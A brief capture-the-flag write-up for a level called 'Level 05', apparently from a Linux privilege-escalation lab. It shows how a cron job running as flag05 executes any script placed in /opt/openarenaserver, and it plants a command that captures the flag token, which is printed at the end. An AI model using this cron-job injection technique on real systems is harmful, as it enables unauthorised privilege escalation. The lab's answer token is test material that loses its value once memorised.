# Level 05

On SSH login, `You have new mail` appears on stdout. Mails are stored at `/var/mail/$USER`.

The mail represents a cron task.

```bash
cat /var/mail/level05
# */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
# Minute / Hour / Day / Month / Day of the week
```

The task launched is

```bash
cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

`ulimit` info https://ss64.com/bash/ulimit.html

In this case, `ulimit` sets the maximum amount of cpu time to 5. `bash -x` starts bash in tracing mode. This script executes all scripts in `/opt/openarenaserver/` then deletes them. By placing a file and waiting 2 minutes, we can see that the cron job is on.

```bash
echo "getflag > /tmp/res" > test
cat /tmp/res
# Check flag.Here is your token : viuaaale9huek52boumoomioc
```